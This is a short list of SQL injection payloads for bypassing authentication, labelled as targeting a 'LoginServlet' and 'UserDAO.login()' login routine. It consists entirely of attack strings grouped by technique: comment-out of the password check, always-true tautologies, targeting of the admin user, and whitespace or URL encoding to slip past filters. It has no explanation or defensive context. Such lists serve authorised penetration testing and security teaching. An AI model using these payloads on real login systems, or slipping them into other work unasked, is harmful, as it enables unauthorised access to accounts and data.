# ==========================================================
# SQL Injection Payloads: Authentication Bypass
# Target: LoginServlet -> UserDAO.login()
# ==========================================================

# 1. Classic comment-out query
admin' -- 
admin' #
admin'/*

# 2. Boolean tautology bypass (Always TRUE)
' OR '1'='1' -- 
' OR '1'='1' #
' OR 1=1 -- 
' OR 1=1 LIMIT 1; -- 
' OR ''='

# 3. Targeted user extraction with tautology
admin' OR '1'='1
' OR username='admin' -- 

# 4. Advanced bypass with whitespace encoding
admin'%20or%20'1'='1'--%20
admin'/**/or/**/1=1#
